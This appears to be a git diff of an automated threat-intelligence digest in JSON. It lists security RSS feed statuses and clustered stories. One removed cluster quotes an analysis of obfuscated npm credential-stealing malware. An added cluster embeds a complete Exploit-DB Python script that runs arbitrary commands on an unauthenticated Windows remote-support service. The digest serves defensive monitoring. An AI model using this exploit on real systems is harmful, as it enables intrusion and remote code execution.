@@ -1,14 +1,14 @@
 {
-  "generated_at": "2026-05-20T22:39:41.594816+00:00",
+  "generated_at": "2026-05-21T00:13:19.250321+00:00",
   "lookback_hours": 168,
   "lookback_human": "7 days",
   "total_feeds": 80,
-  "feeds_ok": 78,
-  "total_items_in_window": 486,
-  "total_clusters_raw": 465,
+  "feeds_ok": 79,
+  "total_items_in_window": 482,
+  "total_clusters_raw": 461,
   "total_clusters_in_packet": 80,
-  "dropped_low_score": 303,
-  "dropped_overflow": 82,
+  "dropped_low_score": 305,
+  "dropped_overflow": 76,
   "cohort_metadata": {
     "threat_research_primary": {
       "description": "Primary vendor and research-team intelligence with strong technical depth.",
@@ -67,20 +67,6 @@
     }
   },
   "feed_status": {
-    "Unit 42": {
-      "url": "https://unit42.paloaltonetworks.com/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 3
-    },
-    "Microsoft Security Blog": {
-      "url": "https://www.microsoft.com/en-us/security/blog/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 9
-    },
     "CrowdStrike": {
       "url": "https://www.crowdstrike.com/blog/feed/",
       "cohort": "threat_research_primary",
@@ -88,19 +74,12 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "ESET WeLiveSecurity": {
-      "url": "https://www.welivesecurity.com/en/rss/feed/",
+    "Unit 42": {
+      "url": "https://unit42.paloaltonetworks.com/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 100,
+      "item_count": 15,
       "in_window_count": 3
-    },
-    "Microsoft Threat Intelligence": {
-      "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 2
     },
     "SentinelOne Labs": {
       "url": "https://www.sentinelone.com/labs/feed/",
@@ -109,12 +88,12 @@
       "item_count": 10,
       "in_window_count": 1
     },
-    "Check Point Research": {
-      "url": "https://research.checkpoint.com/feed/",
+    "Microsoft Security Blog": {
+      "url": "https://www.microsoft.com/en-us/security/blog/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 15,
-      "in_window_count": 1
+      "item_count": 10,
+      "in_window_count": 9
     },
     "Trend Micro Research": {
       "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
@@ -123,11 +102,60 @@
       "item_count": 24,
       "in_window_count": 0
     },
+    "Check Point Research": {
+      "url": "https://research.checkpoint.com/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 1
+    },
+    "Microsoft Threat Intelligence": {
+      "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 2
+    },
+    "ESET WeLiveSecurity": {
+      "url": "https://www.welivesecurity.com/en/rss/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 3
+    },
     "Google Threat Analysis Group": {
       "url": "https://blog.google/threat-analysis-group/rss/",
       "cohort": "threat_research_primary",
       "status": "parse_error",
       "item_count": 0,
+      "in_window_count": 0
+    },
+    "Citizen Lab": {
+      "url": "https://citizenlab.ca/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
+    },
+    "NCSC UK": {
+      "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
+      "cohort": "government_authoritative",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 1
+    },
+    "Kaspersky Securelist": {
+      "url": "https://securelist.com/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 4
+    },
+    "Sekoia": {
+      "url": "https://blog.sekoia.io/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
       "in_window_count": 0
     },
     "Cisco Talos": {
@@ -137,40 +165,12 @@
       "item_count": 15,
       "in_window_count": 4
     },
-    "NCSC UK": {
-      "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
-      "cohort": "government_authoritative",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
-    },
-    "Sekoia": {
-      "url": "https://blog.sekoia.io/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
-    },
     "SANS Internet Storm Center": {
       "url": "https://isc.sans.edu/rssfeed_full.xml",
       "cohort": "government_authoritative",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 7
-    },
-    "Citizen Lab": {
-      "url": "https://citizenlab.ca/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
-    },
-    "Volexity": {
-      "url": "https://www.volexity.com/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
     },
     "PortSwigger Research": {
       "url": "https://portswigger.net/research/rss",
@@ -179,12 +179,19 @@
       "item_count": 40,
       "in_window_count": 0
     },
+    "Assetnote": {
+      "url": "https://www.assetnote.io/resources/research/rss.xml",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 78,
+      "in_window_count": 0
+    },
     "Recorded Future": {
       "url": "https://www.recordedfuture.com/feed",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 50,
-      "in_window_count": 4
+      "in_window_count": 2
     },
     "Horizon3 Attack Research": {
       "url": "https://horizon3.ai/feed/",
@@ -193,33 +200,26 @@
       "item_count": 10,
       "in_window_count": 8
     },
-    "Assetnote": {
-      "url": "https://www.assetnote.io/resources/research/rss.xml",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 78,
-      "in_window_count": 0
-    },
-    "Kaspersky Securelist": {
-      "url": "https://securelist.com/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 4
-    },
-    "Exploit-DB": {
-      "url": "https://www.exploit-db.com/rss.xml",
-      "cohort": "offensive_vulnerability_research",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
-    },
     "Red Canary": {
       "url": "https://redcanary.com/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 0
+    },
+    "Exploit-DB": {
+      "url": "https://www.exploit-db.com/rss.xml",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 3
+    },
+    "GitHub Security Lab": {
+      "url": "https://github.blog/category/security/feed/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 2
     },
     "The DFIR Report": {
       "url": "https://thedfirreport.com/feed/",
@@ -228,22 +228,15 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "watchTowr Labs": {
-      "url": "https://labs.watchtowr.com/rss/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 0
-    },
-    "Active Countermeasures": {
-      "url": "https://www.activecountermeasures.com/feed/",
-      "cohort": "detection_response_operations",
+    "Volexity": {
+      "url": "https://www.volexity.com/feed/",
+      "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 0
     },
-    "Proofpoint Threat Insight": {
-      "url": "https://www.proofpoint.com/us/rss.xml",
+    "Active Countermeasures": {
+      "url": "https://www.activecountermeasures.com/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
@@ -256,12 +249,19 @@
       "item_count": 10,
       "in_window_count": 2
     },
-    "Sophos X-Ops": {
-      "url": "https://news.sophos.com/en-us/category/threat-research/feed/",
+    "Proofpoint Threat Insight": {
+      "url": "https://www.proofpoint.com/us/rss.xml",
       "cohort": "detection_response_operations",
       "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
+    },
+    "watchTowr Labs": {
+      "url": "https://labs.watchtowr.com/rss/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
       "item_count": 15,
-      "in_window_count": 2
+      "in_window_count": 0
     },
     "Elastic Security Labs": {
       "url": "https://www.elastic.co/security-labs/rss/feed.xml",
@@ -277,26 +277,12 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Trail of Bits": {
-      "url": "https://blog.trailofbits.com/feed/",
-      "cohort": "offensive_vulnerability_research",
+    "Sophos X-Ops": {
+      "url": "https://news.sophos.com/en-us/category/threat-research/feed/",
+      "cohort": "detection_response_operations",
       "status": "ok",
-      "item_count": 20,
-      "in_window_count": 0
-    },
-    "Rapid7": {
-      "url": "https://www.rapid7.com/blog/rss/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 6
-    },
-    "Datadog Security Labs": {
-      "url": "https://securitylabs.datadoghq.com/rss/feed.xml",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 30,
-      "in_window_count": 3
+      "item_count": 15,
+      "in_window_count": 1
     },
     "Orca Security Research": {
       "url": "https://orca.security/resources/blog/feed/",
@@ -305,12 +291,26 @@
       "item_count": 10,
       "in_window_count": 8
     },
-    "Sysdig": {
-      "url": "https://sysdig.com/feed/",
+    "Huntress": {
+      "url": "https://www.huntress.com/blog/rss.xml",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 100,
-      "in_window_count": 7
+      "in_window_count": 10
+    },
+    "Trail of Bits": {
+      "url": "https://blog.trailofbits.com/feed/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 0
+    },
+    "Datadog Security Labs": {
+      "url": "https://securitylabs.datadoghq.com/rss/feed.xml",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 30,
+      "in_window_count": 1
     },
     "Permiso Security": {
       "url": "https://permiso.io/blog/rss.xml",
@@ -319,12 +319,12 @@
       "item_count": 10,
       "in_window_count": 2
     },
-    "Huntress": {
-      "url": "https://www.huntress.com/blog/rss.xml",
+    "Sysdig": {
+      "url": "https://sysdig.com/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 100,
-      "in_window_count": 10
+      "in_window_count": 5
     },
     "AWS Security Blog": {
       "url": "https://aws.amazon.com/blogs/security/feed/",
@@ -333,19 +333,19 @@
       "item_count": 20,
       "in_window_count": 7
     },
+    "Rapid7": {
+      "url": "https://www.rapid7.com/blog/rss/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 6
+    },
     "Protect AI": {
       "url": "https://protectai.com/blog/rss.xml",
       "cohort": "ai_security_agentic_risk",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 0
-    },
-    "GitHub Security Lab": {
-      "url": "https://github.blog/category/security/feed/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 2
     },
     "Google DeepMind Blog": {
       "url": "https://deepmind.google/blog/rss.xml",
@@ -368,6 +368,20 @@
       "item_count": 100,
       "in_window_count": 4
     },
+    "Simon Willison": {
+      "url": "https://simonwillison.net/atom/everything/",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 30,
+      "in_window_count": 20
+    },
+    "Chainalysis": {
+      "url": "https://www.chainalysis.com/blog/feed/",
+      "cohort": "ransomware_ecrime_financial_crime",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 2
+    },
     "Cloudflare Security": {
       "url": "https://blog.cloudflare.com/tag/security/rss/",
       "cohort": "cloud_identity_infrastructure",
@@ -382,32 +396,11 @@
       "item_count": 10,
       "in_window_count": 3
     },
-    "Simon Willison": {
-      "url": "https://simonwillison.net/atom/everything/",
+    "Embrace the Red": {
+      "url": "https://embracethered.com/blog/index.xml",
       "cohort": "ai_security_agentic_risk",
       "status": "ok",
-      "item_count": 30,
-      "in_window_count": 21
-    },
-    "Chainalysis": {
-      "url": "https://www.chainalysis.com/blog/feed/",
-      "cohort": "ransomware_ecrime_financial_crime",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
-    },
-    "Google Cloud Threat Intelligence": {
-      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
-    },
-    "Cloudflare Radar": {
-      "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 20,
+      "item_count": 100,
       "in_window_count": 0
     },
     "BleepingComputer": {
@@ -417,12 +410,12 @@
       "item_count": 15,
       "in_window_count": 15
     },
-    "Black Hills Information Security": {
-      "url": "https://www.blackhillsinfosec.com/feed/",
-      "cohort": "detection_response_operations",
+    "Cloudflare Radar": {
+      "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
+      "cohort": "cloud_identity_infrastructure",
       "status": "ok",
-      "item_count": 100,
-      "in_window_count": 1
+      "item_count": 20,
+      "in_window_count": 0
     },
     "Google Cloud Security": {
       "url": "https://cloudblog.withgoogle.com/rss/",
@@ -431,26 +424,19 @@
       "item_count": 20,
       "in_window_count": 15
     },
-    "The Record": {
-      "url": "https://therecord.media/feed",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 5,
-      "in_window_count": 5
-    },
-    "Embrace the Red": {
-      "url": "https://embracethered.com/blog/index.xml",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 0
-    },
     "Interconnects": {
       "url": "https://www.interconnects.ai/feed",
       "cohort": "ai_security_agentic_risk",
       "status": "ok",
       "item_count": 20,
       "in_window_count": 1
+    },
+    "The Record": {
+      "url": "https://therecord.media/feed",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 5,
+      "in_window_count": 5
     },
     "Team Cymru": {
       "url": "https://www.team-cymru.com/post/rss.xml",
@@ -459,6 +445,13 @@
       "item_count": 100,
       "in_window_count": 0
     },
+    "Help Net Security": {
+      "url": "https://www.helpnetsecurity.com/feed/",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 10
+    },
     "SecurityWeek": {
       "url": "https://www.securityweek.com/feed/",
       "cohort": "cyber_news_breach_reporting",
@@ -466,8 +459,8 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Help Net Security": {
-      "url": "https://www.helpnetsecurity.com/feed/",
+    "CyberScoop": {
+      "url": "https://cyberscoop.com/feed/",
       "cohort": "cyber_news_breach_reporting",
       "status": "ok",
       "item_count": 10,
@@ -480,20 +473,6 @@
       "item_count": 20,
       "in_window_count": 0
     },
-    "CyberScoop": {
-      "url": "https://cyberscoop.com/feed/",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 10
-    },
-    "Schneier on Security": {
-      "url": "https://www.schneier.com/feed/atom/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 7
-    },
     "Dark Reading": {
       "url": "https://www.darkreading.com/rss.xml",
       "cohort": "cyber_news_breach_reporting",
@@ -501,19 +480,19 @@
       "item_count": 50,
       "in_window_count": 31
     },
+    "Black Hills Information Security": {
+      "url": "https://www.blackhillsinfosec.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 1
+    },
     "The Hacker News": {
       "url": "https://feeds.feedburner.com/TheHackersNews",
       "cohort": "cyber_news_breach_reporting",
       "status": "ok",
       "item_count": 50,
       "in_window_count": 42
-    },
-    "Krebs on Security": {
-      "url": "https://krebsonsecurity.com/feed/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
     },
     "Intel 471": {
       "url": "https://intel471.com/blog/feed",
@@ -529,19 +508,12 @@
       "item_count": 20,
       "in_window_count": 0
     },
-    "Infosecurity Magazine": {
-      "url": "https://www.infosecurity-magazine.com/rss/news/",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 24
-    },
-    "Troy Hunt": {
-      "url": "https://www.troyhunt.com/rss/",
+    "Schneier on Security": {
+      "url": "https://www.schneier.com/feed/atom/",
       "cohort": "practitioner_analysis",
       "status": "ok",
-      "item_count": 15,
-      "in_window_count": 2
+      "item_count": 10,
+      "in_window_count": 7
     },
     "Graham Cluley": {
       "url": "https://grahamcluley.com/feed/",
@@ -550,26 +522,26 @@
       "item_count": 20,
       "in_window_count": 4
     },
-    "Reddit r/netsec": {
-      "url": "https://www.reddit.com/r/netsec/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 25,
-      "in_window_count": 22
-    },
-    "Risky Business News": {
-      "url": "https://risky.biz/feeds/risky-business-news/",
+    "Troy Hunt": {
+      "url": "https://www.troyhunt.com/rss/",
       "cohort": "practitioner_analysis",
       "status": "ok",
-      "item_count": 100,
-      "in_window_count": 6
+      "item_count": 15,
+      "in_window_count": 2
     },
-    "Reddit r/cybersecurity": {
-      "url": "https://www.reddit.com/r/cybersecurity/.rss",
-      "cohort": "reddit_practitioner_osint",
+    "Infosecurity Magazine": {
+      "url": "https://www.infosecurity-magazine.com/rss/news/",
+      "cohort": "cyber_news_breach_reporting",
       "status": "ok",
-      "item_count": 25,
-      "in_window_count": 25
+      "item_count": 100,
+      "in_window_count": 24
+    },
+    "Krebs on Security": {
+      "url": "https://krebsonsecurity.com/feed/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
     },
     "Reddit r/blueteamsec": {
       "url": "https://www.reddit.com/r/blueteamsec/.rss",
@@ -578,26 +550,33 @@
       "item_count": 25,
       "in_window_count": 24
     },
-    "tl;dr sec": {
-      "url": "https://tldrsec.com/feed.xml",
-      "cohort": "practitioner_analysis",
+    "Reddit r/netsec": {
+      "url": "https://www.reddit.com/r/netsec/.rss",
+      "cohort": "reddit_practitioner_osint",
       "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
+      "item_count": 25,
+      "in_window_count": 22
     },
-    "Reddit r/msp": {
-      "url": "https://www.reddit.com/r/msp/.rss",
+    "Reddit r/cybersecurity": {
+      "url": "https://www.reddit.com/r/cybersecurity/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 25,
       "in_window_count": 25
     },
-    "Reddit r/netsecstudents": {
-      "url": "https://www.reddit.com/r/netsecstudents/.rss",
-      "cohort": "reddit_practitioner_osint",
+    "Risky Business News": {
+      "url": "https://risky.biz/feeds/risky-business-news/",
+      "cohort": "practitioner_analysis",
       "status": "ok",
-      "item_count": 25,
+      "item_count": 100,
       "in_window_count": 6
+    },
+    "Google Cloud Threat Intelligence": {
+      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 1
     },
     "Reddit r/sysadmin": {
       "url": "https://www.reddit.com/r/sysadmin/.rss",
@@ -606,12 +585,33 @@
       "item_count": 25,
       "in_window_count": 24
     },
+    "Reddit r/msp": {
+      "url": "https://www.reddit.com/r/msp/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 25,
+      "in_window_count": 25
+    },
     "Reddit r/AskNetsec": {
       "url": "https://www.reddit.com/r/AskNetsec/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 25,
       "in_window_count": 23
+    },
+    "Reddit r/netsecstudents": {
+      "url": "https://www.reddit.com/r/netsecstudents/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 25,
+      "in_window_count": 6
+    },
+    "tl;dr sec": {
+      "url": "https://tldrsec.com/feed.xml",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 1
     },
     "Just Security": {
       "url": "https://www.justsecurity.org/feed/",
@@ -2722,106 +2722,6 @@
       ]
     },
     {
-      "cluster_id": "a17791a046",
-      "priority_score": 14,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "credential_attack",
-          "malware",
-          "supply_chain"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "manufacturing_industrial"
-        ],
-        "affected_products": [
-          "AWS",
-          "GitHub",
-          "Kubernetes",
-          "npm"
-        ],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "geographic_scope": [],
-        "urgency_signals": [],
-        "content_type": [
-          "uncategorized"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "Microsoft Security Blog",
-        "cohort": "threat_research_primary",
-        "title": "Mini Shai Hulud: Compromised @antv npm packages enable CI/CD credential theft",
-        "link": "https://www.microsoft.com/en-us/security/blog/2026/05/20/mini-shai-hulud-compromised-antv-npm-packages-enable-ci-cd-credential-theft/",
-        "published": "2026-05-20T17:48:44+00:00",
-        "summary": "Compromised @antv npm packages deploy the Mini Shai-Hulud payload to steal CI/CD secrets from Linux-based automation environments. The malware executes during npm install and targets credentials across GitHub, AWS, Kubernetes, Vault, npm, and 1Password platforms. The post Mini Shai Hulud: Compromised @antv npm packages enable CI/CD credential theft appeared first on Microsoft Security Blog .",
-        "full_body": "Share Link copied to clipboard! Tags Linux Content types Research Products and services Microsoft Defender Topics Actionable threat insights Defending against advanced tactics Microsoft has identified an active supply chain attack targeting the @antv node package manager (npm) package ecosystem. A threat actor compromised an @antv maintainer account and published malicious versions of widely used data-visualization packages, resulting in cascading downstream impact. The compromise propagated through dependency chains into libraries like echarts-for-react (which has more than 1 million weekly downloads), expanding the blast radius into CI/CD pipelines and cloud workloads across the ecosystem. The malicious payload—a ~499 KB obfuscated JavaScript file—runs silently during npm install and is purpose-built to steal credentials from GitHub Actions environments. Key capabilities observed in the payload include multi-platform credential theft (GitHub, Amazon Web Services, HashiCorp Vault, npm, Kubernetes, 1Password), GitHub Action Runner process memory scraping, privilege escalation, dual-channel data exfiltration, and Supply chain Levels for Software Artifacts (SLSA) provenance forgery. These capabilities suggest a deliberate effort to evade analysis and an apparent focus on CI/CD environments. The authors of the antv account have also since confirmed in a ticket on the repo that the situation is now resolved. Attack chain overview Figure 1. @antv npm supply chain attack flow. The @antv organization maintains charting libraries (G2, G6) embedded across dashboards and applications. The attack proceeds through: Maintainer account compromise and publication of malicious @antv package versions Downstream dependency amplification ( echarts-for-react , size-sensor , and others) Automatic payload execution through a preinstall hook during npm install Execution chain: node → shell → bun → payload (Bun runtime installed if absent) Technical analysis The payload replaces the legitimate index.js with a single-line obfuscated script. Obfuscation Layer 1: 1,732 Base64-encoded strings in a rotated array, decoded through lookup function with the shuffle key 0xa31de Layer 2: Critical strings such as command-and-control (C2) domain and env var names are encrypted with a custom PBKDF2 and SHA-256 cipher, which is decrypted at runtime. Environment gating: The payload exits immediately if it’s not running on GitHub Actions on Linux Branch avoidance: Skips the main , master , dependabot/ , renovate/ , and gh-pages when using Git API exfiltration // Layer 1: 1,732 strings in rotated array with base64 decode (function(_0x44be0e, _0x3ff020){ // Array shuffle IIFE with key 0xa31de _0x335af4['push'](_0x335af4['shift']()); })(_0x71ec, 0xa31de)); // Layer 2: PBKDF2+SHA256 runtime decryption for critical strings var e6 = \"a8269c01069452afb8a54de904e6419578d155fdbdb9e566bab8576a4266b61e\"; var t6 = \"7f44e4ba6f6a71bd0f789e7f83bd3104\"; var u5 = new du(e6, t6); // PBKDF2 cipher instance globalThis[\"f2959c600\"] = function(s) { return u5.decode(s); }; // Environment gate - exits if not GitHub Actions on Linux this['isGitHubActions'] = process.env[f2959c600('68zz23c6NGR9...')] === 'true'; this['isLinuxRunner'] = process.env[f2959c600('NhUrwwYEwYIJ...')] === 'Linux'; Credential theft The payload targets secrets across six platforms: GitHub : Extracts GITHUB_TOKEN , scans for Personal Access Tokens ( gh[op]_ ) and installation tokens ( ghs_ ), validates through /user API, and enumerates repo and org secrets. Amazon Web Services(AWS) : Queries Instance Metadata Service (169.254.169[.]254), Elastic Container Service metadata (169.254.170[.]2), reads .aws/ files, harvests env vars, and then calls SecretsManager across all regions. HashiCorp Vault : Searches 12+ token paths ( /var/run/secrets/vault/token , ~/.vault-token , and others) and connects to a local Vault at 127.0.0[.]1:8200. npm : Validates tokens using /-/whoami , exchanges OpenID Connect (OIDC) tokens for publish",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "supply_chain",
-            "malware",
-            "credential_attack"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "manufacturing_industrial"
-          ],
-          "affected_products": [
-            "AWS",
-            "Kubernetes",
-            "GitHub",
-            "npm"
-          ],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "geographic_scope": [],
-          "urgency_signals": [],
-          "content_type": "uncategorized",
-          "confidence_tier": "tier_1_primary_research"
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Microsoft Security Blog",
-          "cohort": "threat_research_primary",
-          "title": "Mini Shai Hulud: Compromised @antv npm packages enable CI/CD credential theft",
-          "link": "https://www.microsoft.com/en-us/security/blog/2026/05/20/mini-shai-hulud-compromised-antv-npm-packages-enable-ci-cd-credential-theft/",
-          "published": "2026-05-20T17:48:44+00:00",
-          "summary": "Compromised @antv npm packages deploy the Mini Shai-Hulud payload to steal CI/CD secrets from Linux-based automation environments. The malware executes during npm install and targets credentials across GitHub, AWS, Kubernetes, Vault, npm, and 1Password platforms. The post Mini Shai Hulud: Compromised @antv npm packages enable CI/CD credential theft appeared first on Microsoft Security Blog .",
-          "taxonomy": {
-            "threat_categories": [
-              "supply_chain",
-              "malware",
-              "credential_attack"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "manufacturing_industrial"
-            ],
-            "affected_products": [
-              "AWS",
-              "Kubernetes",
-              "GitHub",
-              "npm"
-            ],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "geographic_scope": [],
-            "urgency_signals": [],
-            "content_type": "uncategorized",
-            "confidence_tier": "tier_1_primary_research"
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "a737fa0143",
       "priority_score": 14,
       "member_count": 1,
@@ -3065,6 +2965,85 @@
       ]
     },
     {
+      "cluster_id": "3bf2fbf315",
+      "priority_score": 14,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [
+          "Microsoft Windows"
+        ],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "geographic_scope": [],
+        "urgency_signals": [
+          "preauth_unauth"
+        ],
+        "content_type": [
+          "uncategorized"
+        ],
+        "confidence_tier": [
+          "tier_1_offensive_research"
+        ]
+      },
+      "primary": {
+        "source": "Exploit-DB",
+        "cohort": "offensive_vulnerability_research",
+        "title": "[local] Remote Sunrise Helper for Windows 2026.14 - Remote Code Execution",
+        "link": "https://www.exploit-db.com/exploits/52565",
+        "published": "2026-05-15T00:00:00+00:00",
+        "summary": "Remote Sunrise Helper for Windows 2026.14 - Remote Code Execution",
+        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training Remote Sunrise Helper for Windows 2026.14 - Remote Code Execution EDB-ID: 52565 CVE: N/A EDB Verified: Author: Chokri Hammedi Type: local Exploit: / Platform: Windows Date: 2026-05-15 Vulnerable App: # Exploit Title: Remote Sunrise Helper for Windows 2026.14 - Unauthenticated Remote Code Execution # Date: 2026-04-20 # Exploit Author: Chokri Hammedi # Software: https://rs.ltd/latest.php?os=win # Vendor: https://rs.ltd/ # Version: 2026.14 # Tested on: Windows 10 / Windows 11 #!/usr/bin/env python3 import requests, json, sys, urllib3 urllib3.disable_warnings() target = sys.argv[1] cmd = sys.argv[2] url = f\"https://{target}:49762\" headers = {\"X-HostName\": \"a\", \"X-ClientToken\": \"a\", \"X-HostFullModel\": \"a\"} r = requests.get(f\"{url}/api/getVersion\", verify=False, timeout=5) data = r.json() if data.get(\"requires.auth\") == False: r = requests.post(f\"{url}/api/executeScript\", headers={**headers, \"X-Script\": cmd}, verify=False) result = json.loads(r.text) print(result.get('result', result.get('error', ''))) else: print(\"[*] Not vulnerable - authentication required\") Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [
+            "Microsoft Windows"
+          ],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "geographic_scope": [],
+          "urgency_signals": [
+            "preauth_unauth"
+          ],
+          "content_type": "uncategorized",
+          "confidence_tier": "tier_1_offensive_research"
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Exploit-DB",
+          "cohort": "offensive_vulnerability_research",
+          "title": "[local] Remote Sunrise Helper for Windows 2026.14 - Remote Code Execution",
+          "link": "https://www.exploit-db.com/exploits/52565",
+          "published": "2026-05-15T00:00:00+00:00",
